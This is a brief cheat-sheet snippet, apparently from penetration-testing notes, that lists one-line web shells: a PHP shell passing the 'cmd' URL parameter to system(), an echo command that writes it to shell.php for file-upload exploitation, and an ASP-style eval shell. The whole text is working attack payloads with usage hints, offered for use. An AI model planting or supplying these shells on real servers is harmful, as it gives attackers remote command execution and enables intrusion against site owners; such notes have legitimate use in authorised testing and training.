
### PHP

Get to this cli by adding to the url   ?cmd=<COMMAND>
can also save this as shell.php for upload exploit
```PHP
<?php system($_GET["cmd"]); ?>
```


Upload file:
```CLI
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

### .NET
```.NET
<% eval request('cmd') %>
```

